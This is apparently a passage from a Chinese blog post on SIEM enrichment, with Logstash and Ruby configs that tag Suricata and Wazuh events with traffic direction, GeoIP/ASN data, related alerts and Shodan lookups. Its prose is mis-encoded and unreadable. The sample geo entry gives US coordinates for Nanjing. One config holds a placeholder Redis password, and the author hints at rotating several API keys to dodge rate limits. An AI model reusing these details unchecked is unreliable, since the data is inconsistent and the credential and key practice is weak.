class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> src_private <span class="keyword">and</span> <span class="keyword">not</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> src_private <span class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&quot;[network][direction]&quot;</span>, direction)</span><br><span class="line">    event.set(<span class="string">&quot;[network][zone]&quot;</span>, zone)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-2-enrichment-related-domain-for-suricata"><a href="#2-1-2-enrichment-related-domain-for-suricata" class="headerlink" title="2.1.2 enrichment_related_domain_for_suricata"></a>2.1.2 enrichment_related_domain_for_suricata</h5><p>â€‹        ä¸ºäº†ä¾¿äºåæœŸåšå…³è”åˆ†æï¼Œå¢åŠ äº†æ”»å‡»è€…ä¸åŸŸåçš„å…³è”å­—æ®µã€‚</p>
<h6 id="Logstash-Config-9"><a href="#Logstash-Config-9" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-related_domain.conf">enrichment_related_domain_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [url][domain] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                source_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                url_domain = event.get(&#x27;[url][domain]&#x27;)</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][domain]&#x27;, [source_ip, url_domain])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-3-add-geo-private-ip"><a href="#2-1-3-add-geo-private-ip" class="headerlink" title="2.1.3 add_geo-private_ip"></a>2.1.3 add_geo-private_ip</h5><p>â€‹        ä¸ºå†…ç½‘IPå¢åŠ åœ°ç†ä½ç½®æ ‡ç¤ºï¼Œä¸»è¦æ˜¯ä¸ºäº†<strong>Dashboard</strong>å±•ç¤ºçš„æ—¶å€™å¯ä»¥çœ‹åˆ°èµ„äº§åœ¨åœ°å›¾ä¸Šçš„åæ ‡ã€‚<strong>åœ°å›¾ç‚®ï¼ŸBIUBIUBIUï¼Ÿ</strong>ğŸ˜‚ã€‚ç”±äºä¸æ˜¯å¤–ç½‘IPæ²¡åŠæ³•åŠ è½½GeoIPè¿›è¡ŒåŒ¹é…ï¼Œè¿™é‡Œä½¿ç”¨äº†<strong>Translate</strong>è¿™ä¸ªæ’ä»¶æ¥è¿›è¡Œé…ç½®ã€‚</p>
<h6 id="Logstash-Conifg"><a href="#Logstash-Conifg" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/70_enrichment-geo_private_ip.conf">add-geo_private_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a><strong>Yaml</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_geo.yml">private_ip_geo.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;location&quot;:&#123;&quot;lat&quot;:45.8491,&quot;lon&quot;:-119.7143&#125;,&quot;country_name&quot;:&quot;China&quot;,&quot;country_iso_code&quot;:&quot;CN&quot;,&quot;region_name&quot;:&quot;Jiangsu&quot;,&quot;region_iso_code&quot;:&quot;JS&quot;,&quot;city_name&quot;:&quot;Nanjing&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_asn.yml">private_ip_asn.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;number&quot;:4134,&quot;organization.name&quot;:&quot;CHINANET-BACKBONE&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-2.png" alt="image-20201209110617996"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-1.png" alt="image-20201208153642680"></p>
<hr>
<h5 id="2-1-4-add-geo-public-ip"><a href="#2-1-4-add-geo-public-ip" class="headerlink" title="2.1.4 add_geo-public_ip"></a>2.1.4 add_geo-public_ip</h5><p>â€‹    å¤–ç½‘IPå°±æ¯”è¾ƒå¥½æå®šäº†ç›´æ¥åŠ è½½GeoIPæ•°æ®å³å¯ã€‚</p>
<h6 id="Logstash-Conifg-1"><a href="#Logstash-Conifg-1" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/71_enrichment-geo_public_ip.conf">add-geo_public_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [<span class="built_in">source</span>][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [destination][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][country_code2]&quot;</span>, <span class="string">&quot;[source][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][region_code]&quot;</span>, <span class="string">&quot;[source][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][asn]&quot;</span>, <span class="string">&quot;[source][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][as_org]&quot;</span>, <span class="string">&quot;[source][as][organization.name]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][country_code2]&quot;</span>, <span class="string">&quot;[destination][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][region_code]&quot;</span>, <span class="string">&quot;[destination][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][asn]&quot;</span>, <span class="string">&quot;[destination][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][as_org]&quot;</span>, <span class="string">&quot;[destination][as][organization.name]&quot;</span>]</span><br><span class="line"></span><br><span class="line">        remove_tag =&gt; [ <span class="string">&quot;_geoip_lookup_failure&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-2-enrichment-alarm-from-siem"><a href="#2-2-enrichment-alarm-from-siem" class="headerlink" title="2.2 enrichment-alarm_from_siem"></a>2.2 enrichment-alarm_from_siem</h4><p>â€‹        é’ˆå¯¹alarmäº‹ä»¶è¿›è¡Œä¸°å¯ŒåŒ–ï¼Œä¹Ÿå°±æ˜¯SIEMå‘å‡ºçš„æ•°æ®ã€‚ä¸Šå›¾ä¸­çº¢è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†</p>
<h5 id="2-2-1-enrichment-related-event-id-for-wazuh"><a href="#2-2-1-enrichment-related-event-id-for-wazuh" class="headerlink" title="2.2.1 enrichment-related_event_id_for_wazuh"></a>2.2.1 enrichment-related_event_id_for_wazuh</h5><p>â€‹    ä¸ºSIEMå‘Šè­¦å¢åŠ äº†<strong>Hunting</strong>çš„åŠŸèƒ½ï¼Œé€šè¿‡è¯¥åŠŸèƒ½å¯ç›´æ¥æº¯æºåˆ°è§¦å‘alarmçš„æ‰€æœ‰alertäº‹ä»¶ã€‚</p>
<h6 id="Logstash-Config-10"><a href="#Logstash-Config-10" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-related.conf"><strong>enrichment-related_event_id_for_wazuh.conf</strong></a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> and [related][event][<span class="built_in">log</span>] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_related_event_id.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-2"><a href="#Ruby-Code-2" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_related_event_id.rb">enrichment-related_event_id_for_wazuh.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@pattern</span> = <span class="regexp">/(?:\\n)?\w+ \d+ \d+:\d+:\d+ logstash NORMALIZED\[-\]: /</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    event_id = []</span><br><span class="line">    rule_id = []</span><br><span class="line">    rule_name = []</span><br><span class="line">    event_log = event.get(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atomic_rules = event_log.split(<span class="variable">@pattern</span>)[<span class="number">1</span> .. -<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> atomic <span class="keyword">in</span> atomic_rules <span class="keyword">do</span></span><br><span class="line">        e_id = JSON.parse(atomic)[<span class="string">&#x27;event&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_id = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_name = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        event_id.push(e_id)</span><br><span class="line">        rule_id.push(r_id)</span><br><span class="line">        rule_name.push(r_name)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    event.set(<span class="string">&#x27;[related][event][id]&#x27;</span>, event_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][id]&#x27;</span>, rule_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][name]&#x27;</span>, rule_name)</span><br><span class="line">    event.remove(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h6><p>â€‹        ä»¥ä¸‹æ˜¯ä¸€ä¸ªWazuhèšåˆå‘Šè­¦ï¼Œåˆ†æäººå‘˜é€šè¿‡ç‚¹å‡»<code>threat.hunting.event.id</code>å­—æ®µå³å¯æº¯æºå‡ºè§¦å‘è¯¥èšåˆè§„åˆ™çš„åº•å±‚alertäº‹ä»¶ã€‚</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alarm.png" alt="image-20201204175051910"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alert.png" alt="image-20201204175244182"></p>
<hr>
<h3 id="3-Threat-Intelligence"><a href="#3-Threat-Intelligence" class="headerlink" title="3. Threat Intelligence"></a>3. Threat Intelligence</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat-intelligence.png" alt="threat-intelligence"></p>
<h4 id="3-1-threatIntel-alert-to-siem"><a href="#3-1-threatIntel-alert-to-siem" class="headerlink" title="3.1 threatIntel_alert_to_siem"></a>3.1 threatIntel_alert_to_siem</h4><p>â€‹        é€šè¿‡LogstashåŠ è½½Rubyè„šæœ¬ï¼Œå°†IoCæ¨é€è‡³Redisã€‚ä¸ºäº†é¿å…é‡å¤æ¨é€ï¼Œæ¯ä¸ªIoCéƒ½ä¼šè®¾ç½®è¶…æ—¶æ—¶é—´ï¼ˆé»˜è®¤7å¤©ï¼‰ã€‚å¦‚ä¸Šå›¾ä¸­è“è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†ï¼›</p>
<h5 id="3-1-1-add-ti-shodan"><a href="#3-1-1-add-ti-shodan" class="headerlink" title="3.1.1 add-ti_shodan"></a>3.1.1 add-ti_shodan</h5><p>â€‹        å¯¹äºæ”»å‡»è¿‡æˆ‘ä»¬çš„IPåœ°å€æˆ‘ä»¬éƒ½ä¼šåˆ©ç”¨<strong>Shodan</strong>è¿›è¡Œåå‘æ¢æµ‹ï¼Œæ”¶é›†ä¸€æ³¢æ”»å‡»è€…ï¼ˆè‚‰é¸¡ï¼‰çš„èµ„äº§ä¿¡æ¯ï¼Œç•™ç»™åé¢åˆ†æäººå‘˜ç”¨ã€‚ç”±äºå·²ç»è®¾ç½®äº†IoCè¶…æ—¶æ—¶é—´ï¼Œæ‰€ä»¥åœ¨è¶…æ—¶ä¹‹å‰IoCä¸ä¼šé‡å¤æ¨é€ã€‚å½“ç„¶ï¼Œå•ä¸ªKeyè°ƒç”¨APIé¢‘ç‡è¿˜æ˜¯è¦æ§åˆ¶ä¸€ä¸‹çš„ï¼Œä¸è¿‡ä½ å¯ä»¥é€‰æ‹©å¤šä¸ªKeyå“¦ã€‚<strong>ä½ æ‡‚çš„</strong>ğŸ˜ˆğŸ˜ˆğŸ˜ˆ</p>
<h6 id="Logstash-Config-11"><a href="#Logstash-Config-11" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-ti_shodan.conf">add-ti_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alert_prefix&quot;</span> =&gt; <span class="string">&quot;alert:&quot;</span></span><br><span class="line">                <span class="string">&quot;expire&quot;</span> =&gt; 86400</span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;spider_db&quot;</span> =&gt; 5</span><br><span class="line">                <span class="string">&quot;spider_key&quot;</span> =&gt; <span class="string">&quot;spider:shodan:ioc&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-3"><a href="#Ruby-Code-3" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_shodan.rb</a></strong></li>
</ul>
